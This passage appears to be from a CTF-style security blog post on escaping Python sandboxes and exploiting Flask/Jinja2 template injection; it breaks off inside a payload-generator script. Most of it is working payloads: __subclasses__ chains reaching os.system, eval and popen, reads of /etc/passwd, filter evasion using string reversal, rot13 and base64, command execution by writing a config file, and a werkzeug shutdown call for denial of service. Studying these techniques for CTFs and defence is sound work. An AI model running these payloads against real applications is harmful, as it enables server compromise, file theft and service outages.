<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os		<span class="comment"># import first</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.__file__		<span class="comment"># attribute xxx.__file__</span></span><br><span class="line"><span class="string">&#x27;/usr/lib/python2.7/os.pyc&#x27;</span></span><br></pre></td></tr></table></figure>
<p>Then look at <code>modules</code> under <code>sys</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&#x27;copy_reg&#x27;</span>: &lt;module <span class="string">&#x27;copy_reg&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/copy_reg.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;sre_compile&#x27;</span>: &lt;module <span class="string">&#x27;sre_compile&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/sre_compile.pyc&#x27;</span>&gt;, </span><br><span class="line"> ...,</span><br><span class="line"> <span class="string">&#x27;os&#x27;</span>: &lt;module <span class="string">&#x27;os&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/os.pyc&#x27;</span>&gt;, <span class="string">&#x27;_weakref&#x27;</span>: &lt;module <span class="string">&#x27;_weakref&#x27;</span> (built-<span class="keyword">in</span>)&gt;&#125;</span><br></pre></td></tr></table></figure>
<p>Change something to see what happens</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;os&#x27;</span>]=<span class="literal">None</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: No module named os</span><br></pre></td></tr></table></figure>
<p>So we guess, python import modules according to <code>sys.modules</code>, defenders can delete modules in this dict for protection.</p>
<p>What’s the deal? We do the reverse.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;os&#x27;</span>]=<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br></pre></td></tr></table></figure>

<h4 id="Ultimate"><a href="#Ultimate" class="headerlink" title="Ultimate"></a>Ultimate</h4><p>If <code>sys</code>, <code>os</code> and <code>reload</code> are banned, still a way to bypass?</p>
<p>Sure it is.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>execfile(<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>system(<span class="string">&#x27;cat /etc/passwd&#x27;</span>)</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/<span class="built_in">bin</span>/bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">bin</span>:x:<span class="number">2</span>:<span class="number">2</span>:<span class="built_in">bin</span>:/<span class="built_in">bin</span>:/usr/sbin/nologin</span><br><span class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:/dev:/usr/sbin/nologin</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getcwd()</span><br><span class="line"><span class="string">&#x27;/usr/lib/python2.7&#x27;</span></span><br></pre></td></tr></table></figure>
<p>If <code>execfile</code> is banned, use file i&#x2F;o operations to read, then use <code>exec</code> to execute codes. It suits python 3.x</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/usr/lib/python3.6/os.py&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">exec</span>(f.read())</span><br><span class="line">system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>As a defender, delete the module file is the last strike.<br>Finally it’s hard to bypass, but the server may be fragile for lacking dependencies.</p>
<h3 id="Explore-Attrs-amp-Methods"><a href="#Explore-Attrs-amp-Methods" class="headerlink" title="Explore Attrs &amp; Methods"></a>Explore Attrs &amp; Methods</h3><p>use <code>dir()</code> method or <code>__dict__</code> attribute, to list all properties and functions under a specific module&#x2F;class&#x2F;object.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>A.__dict__</span><br><span class="line">mappingproxy(&#123;<span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;asdas&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>: &lt;attribute <span class="string">&#x27;__dict__&#x27;</span> of <span class="string">&#x27;A&#x27;</span> objects&gt;, <span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;__doc__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;__weakref__&#x27;</span>: &lt;attribute <span class="string">&#x27;__weakref__&#x27;</span> of <span class="string">&#x27;A&#x27;</span> objects&gt;, <span class="string">&#x27;c&#x27;</span>: &lt;function A.c at <span class="number">0x7f18ea25e510</span>&gt;, <span class="string">&#x27;__module__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(A)</span><br><span class="line">[<span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>, <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;__weakref__&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>They have differences, like <code>dir</code> suits every module, while <code>__dict__</code> may not exist in some.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>()</span><br><span class="line">[<span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(__doc__)</span><br><span class="line">[<span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__doc__.__dict__</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">AttributeError: <span class="string">&#x27;NoneType&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;__dict__&#x27;</span></span><br></pre></td></tr></table></figure>
<p>Besides, <code>dir</code> gives a list, and <code>__dict__</code> gives a dict containing values.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>()</span><br><span class="line">[<span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> lxml</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(lxml)</span><br><span class="line">[<span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__file__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__path__&#x27;</span>, <span class="string">&#x27;__version__&#x27;</span>, <span class="string">&#x27;get_include&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxml.__dict__</span><br><span class="line">&#123;<span class="string">&#x27;get_include&#x27;</span>: &lt;function get_include at <span class="number">0x7fb1ad84ad50</span>&gt;, </span><br><span class="line"><span class="string">&#x27;__builtins__&#x27;</span>: &#123;<span class="string">&#x27;bytearray&#x27;</span>: &lt;<span class="built_in">type</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;, </span><br><span class="line">...&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Bypass-String-Scanning"><a href="#Bypass-String-Scanning" class="headerlink" title="Bypass String Scanning"></a>Bypass String Scanning</h3><p>Defenders always filter special strings, so we have to change string to bypass.</p>
<p>First we can do python string inversion tricks</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot;txt.galf&quot;</span></span><br><span class="line">restr = <span class="built_in">str</span> [::-<span class="number">1</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;r&#x27;</span>,restr)).read()</span><br><span class="line"><span class="comment"># ().__class__.__bases__[0].__subclasses__()[40](&#x27;r&#x27;,&#x27;flag.txt&#x27;)).read()</span></span><br></pre></td></tr></table></figure>
<p>and string concatenation </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;fla&#x27;</span>+<span class="string">&#x27;g.txt&#x27;</span>)).read()</span><br><span class="line"><span class="comment"># ().__class__.__bases__[0].__subclasses__()[40](&#x27;r&#x27;,&#x27;flag.txt&#x27;)).read()</span></span><br></pre></td></tr></table></figure>
<p>if method name is filtered, use <code>__getattribute__()</code> or <code>__getattr__()</code> or <code>getattr()</code>or <code>__dict__</code>, combine with str concat</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [x <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">&#x27;ca&#x27;</span>+<span class="string">&#x27;tch_warnings&#x27;</span>][<span class="number">0</span>].__init__</span><br><span class="line">x.__getattribute__(<span class="string">&quot;func_global&quot;</span>+<span class="string">&quot;s&quot;</span>)[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;l&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">x.__getattribute__(<span class="string">&quot;func_global&quot;</span>+<span class="string">&quot;s&quot;</span>)[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;ca&#x27;</span>+<span class="string">&#x27;t /home/ctf/flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># As for `func_globals`, each func_* will give you surprise</span></span><br></pre></td></tr></table></figure>

<p>Secondly we do characters encoding</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="built_in">getattr</span>(os,codecs.encode(<span class="string">&quot;flfgrz&quot;</span>,<span class="string">&#x27;rot13&#x27;</span>))(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br><span class="line"><span class="comment"># execute `ifconfig`</span></span><br><span class="line"><span class="comment"># &#x27;getattr&#x27; combine module with its methods/attrs</span></span><br><span class="line"><span class="comment"># &quot;flfgrz&quot; can be decoded as system</span></span><br></pre></td></tr></table></figure>

<p>Base64 is common</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;__import__&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;b3M=&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)](<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>))</span><br><span class="line">&lt;module <span class="string">&#x27;os&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/os.pyc&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>But what if <code>[</code> and <code>]</code> are filtered? We use <code>__getitem__</code> to replace.<br>It is based on: func[‘attr’] &#x3D;&#x3D;&#x3D; func.attr.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">object</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">object</span></span><br></pre></td></tr></table></figure>

<p>What if <code>&#39;</code> and <code>&quot;</code> are also filtered? The solution is not for normal python sandbox, it’s for python web environment.<br>In web framework like <code>flask</code>, use <code>request</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># request.args.xx</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;&#123;[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">40</span>](request.args.s1mple).read()&#125;&#125;&amp;s1mple=/etc/passwd</span><br></pre></td></tr></table></figure>

<p>And what if <code>__</code> is filtered as well? We still use <code>request</code>.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>()[request.args.<span class="keyword">class</span>].bases[<span class="number">0</span>].subclasses()[<span class="number">59</span>].init.<span class="built_in">globals</span>.builtins<span class="string">&#x27;eval&#x27;</span>&amp;<span class="class"><span class="keyword">class</span>=<span class="title">class</span></span></span><br></pre></td></tr></table></figure>

<p>What if <code>{{` and `}}</code> …… ? Use <code>{%if xxxxx}1{% endif %}</code> instead.</p>
<h3 id="Using-Class-Object"><a href="#Using-Class-Object" class="headerlink" title="Using Class Object"></a>Using Class Object</h3><p><code>__mro__</code> method gives a list of parent classes inherited by this.<br>MRO( Method Resolution Order ) indicates that it is associated with inheritance mechanism ( python is multi-inherence ).</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1.</span>.__class__.__mro__</span><br><span class="line">(<span class="built_in">float</span>, <span class="built_in">object</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__mro__</span><br><span class="line">(<span class="built_in">str</span>, basestring, <span class="built_in">object</span>)</span><br></pre></td></tr></table></figure>
<p><code>__subclasses__</code> method gives a list of subclasses</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()</span><br></pre></td></tr></table></figure>
<p>So we can use <code>__mro__</code> and <code>__subclasses__</code> to get object and useful method. <code>__bases__</code> can also be used, and it is a part of <code>__mro__</code> list.</p>
<p>We have file io payloads down here</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># use &#x27;file&#x27; class to read and write</span></span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">40</span>](filename).read()</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/tmp/owned.cfg&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;&lt;malicious code here&gt;&#x27;</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">().__class__.__bases__[0].__subclasses__()[40](r&#x27;</span>xxx<span class="string">&#x27;).read()</span></span><br><span class="line"><span class="string">().__class__.__bases__[0].__subclasses__()[40](&#x27;</span>xxxx<span class="string">&#x27;, &#x27;</span>w<span class="string">&#x27;).write(&#x27;</span>xxx<span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>
<p>If ssti exists, we can use it to get shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/tmp/owned.cfg&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;from subprocess import check_output\n\nRUNCMD = check_output\n&#x27;</span>)</span><br><span class="line">config.from_pyfile(<span class="string">&#x27;/tmp/owned.cfg&#x27;</span>)</span><br><span class="line">config[<span class="string">&#x27;RUNCMD&#x27;</span>](<span class="string">&#x27;/usr/bin/id&#x27;</span>,shell=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># dos for flash ssti</span></span><br><span class="line">request.environ[<span class="string">&#x27;werkzeug.server.shutdown&#x27;</span>]()</span><br><span class="line"></span><br><span class="line"><span class="comment"># if some string is filtered, split it</span></span><br><span class="line">config[<span class="string">&#x27;RUNCMD&#x27;</span>](<span class="string">&#x27;a=l;b=s;$a$b /var/www/html/&#x27;</span>,shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># base64 encode</span></span><br><span class="line">config[<span class="string">&#x27;RUNCMD&#x27;</span>](<span class="string">&#x27;echo cHJpbnQgb3BlbignL3Zhci93d3cvaHRtbC9mbDRnJywncicpLnJlYWQoKQ==|base64 -d&gt;/tmp/get.py&#x27;</span>,shell=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># that is</span></span><br><span class="line">config[<span class="string">&#x27;RUNCMD&#x27;</span>](<span class="string">&#x27;echo print open(&#x27;</span>/var/www/html/fl4g<span class="string">&#x27;,&#x27;</span><span class="string">r&#x27;).read()&gt;/tmp/get.py</span></span><br><span class="line"><span class="string"># then</span></span><br><span class="line"><span class="string">config[&#x27;</span>RUNCMD<span class="string">&#x27;](&#x27;</span>python /tmp/get.py<span class="string">&#x27;,shell=True)</span></span><br></pre></td></tr></table></figure>
<p>Ways to get shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># identify a class index first</span></span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">[].__class__.__base__.__subclasses__().index(warnings.catch_warnings)</span><br><span class="line"><span class="comment"># then use it</span></span><br><span class="line">[].__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>].__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )</span><br><span class="line"><span class="comment"># site._Printer</span></span><br><span class="line">[].__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">71</span>]._Printer__setup.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line"><span class="comment"># builtin_function_or_method</span></span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">29</span>].__call__(<span class="built_in">eval</span>,’os.system(“ls”)’)</span><br><span class="line"></span><br><span class="line"><span class="comment"># simple one</span></span><br><span class="line">[].__getattribute__(<span class="string">&#x27;append&#x27;</span>).__class__.__call__(<span class="built_in">eval</span>, <span class="string">&#x27;1+1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># some specials</span></span><br><span class="line"><span class="built_in">getattr</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;types&#x27;</span>).__builtins__[<span class="string">&#x27;__tropmi__&#x27;</span>[::-<span class="number">1</span>]](<span class="string">&#x27;so&#x27;</span>[::-<span class="number">1</span>]), <span class="string">&#x27;mets&#x27;</span> <span class="string">&#x27;ys&#x27;</span>[::-<span class="number">1</span>])(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># bypass</span></span><br><span class="line"><span class="comment"># `[` and `]` are banned, use `pop()` instead</span></span><br><span class="line">[].__class__.__mro__[-<span class="number">1</span>].__subclasses__().pop(<span class="number">71</span>).__init__.__globals__.pop(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;xxx&#x27;</span>)</span><br></pre></td></tr></table></figure>


<h2 id="Python3-Sandbox-Escape"><a href="#Python3-Sandbox-Escape" class="headerlink" title="Python3 Sandbox Escape"></a>Python3 Sandbox Escape</h2><h3 id="Builtin-Functions"><a href="#Builtin-Functions" class="headerlink" title="Builtin Functions"></a>Builtin Functions</h3><p><code>__builtin__</code> in python 2.x &#x3D;&#x3D;&gt; <code>builtins</code> in python3.x, and needs import.<br>But finally they all have <code>__builtins__</code>, the reference to builtin modules.</p>
<h3 id="File-Operations"><a href="#File-Operations" class="headerlink" title="File Operations"></a>File Operations</h3><p><code>file</code> in python 2.x &#x3D;&gt; <code>open</code> in python 3.x.</p>
<h3 id="Class-Object-Payloads"><a href="#Class-Object-Payloads" class="headerlink" title="Class Object Payloads"></a>Class Object Payloads</h3><p>As python 2.x has different inheritance chain with python 3.x, so we<br>Some payloads in python 3.7</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># still needs to find a class index()</span></span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">xxx = [].__class__.__base__.__subclasses__().index(warnings.catch_warnings) </span><br><span class="line"><span class="comment"># then use it</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[xxx].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[xxx].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>) </span><br></pre></td></tr></table></figure>
<p><em>Things Change in different</em> <strong>python version</strong> <em>environment</em> <strong>!!!</strong><br>so sometimes it will be like</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[xxx].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[xxx].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>and <code>os._wrap_close</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">nnn = [].__class__.__base__.__subclasses__().index(os._wrap_close)</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[nnn].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Scripts"><a href="#Scripts" class="headerlink" title="Scripts"></a>Scripts</h3><p>Here is a script for generating payloads of <code>ssti</code> in <code>flask</code> using <code>jinja2</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># python 3.5</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask 	<span class="comment"># optional</span></span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template <span class="comment"># optional</span></span><br><span class="line"><span class="comment"># Some of special names</span></span><br><span class="line">searchList = [<span class="string">&#x27;__init__&#x27;</span>, <span class="string">&quot;__new__&quot;</span>, <span class="string">&#x27;__del__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__bytes__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__bool__&#x27;</span>, <span class="string">&#x27;__getattr__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__get__&#x27;</span>, <span class="string">&#x27;__set__&#x27;</span>, <span class="string">&#x27;__delete__&#x27;</span>, <span class="string">&#x27;__call__&#x27;</span>, <span class="string">&quot;__instancecheck__&quot;</span>, <span class="string">&#x27;__subclasscheck__&#x27;</span>, <span class="string">&#x27;__len__&#x27;</span>, <span class="string">&#x27;__length_hint__&#x27;</span>, <span class="string">&#x27;__missing__&#x27;</span>,<span class="string">&#x27;__getitem__&#x27;</span>, <span class="string">&#x27;__setitem__&#x27;</span>, <span class="string">&#x27;__iter__&#x27;</span>,<span class="string">&#x27;__delitem__&#x27;</span>, <span class="string">&#x27;__reversed__&#x27;</span>, <span class="string">&#x27;__contains__&#x27;</span>, <span class="string">&#x27;__add__&#x27;</span>, <span class="string">&#x27;__sub__&#x27;</span>,<span class="string">&#x27;__mul__&#x27;</span>]</span><br><span class="line">neededFunction = [<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>]</span><br><span class="line">pay = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Payload?[1|0]&quot;</span>))</span><br><span class="line"><span class="keyword">for</span> index, i <span 